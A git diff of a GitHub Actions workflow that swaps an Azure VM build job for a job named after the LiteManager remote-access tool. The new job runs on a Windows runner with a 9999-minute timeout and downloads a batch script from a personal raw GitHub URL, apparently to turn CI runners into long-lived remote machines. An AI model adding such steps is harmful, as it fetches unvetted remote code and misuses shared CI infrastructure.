@@ -1,24 +1,15 @@
-name: Build and Deploy VM
+name: TOOLBOXLAP- LiteManager
 
 on:
   workflow_dispatch:
 
 jobs:
-  build-and-deploy:
-    runs-on: ubuntu-latest
+  build:
+    name: Start Building...
+    runs-on: windows-2019
+    timeout-minutes: 9999
+    
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Login to Azure
-        uses: azure/login@v1
-        with:
-          creds: ${{ secrets.AZURE_CREDENTIALS }}
-
-      - name: Build VM Image
+      - name: Downloading & Installing Essentials
         run: |
-          az image create --resource-group myResourceGroup --name myImage --source mySource
-
-      - name: Deploy VM
-        run: |
-          az vm create --resource-group myResourceGroup --name myVM --image myImage
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/tollboxlap09/tollboxlap09/refs/heads/main/Downloads.bat" 
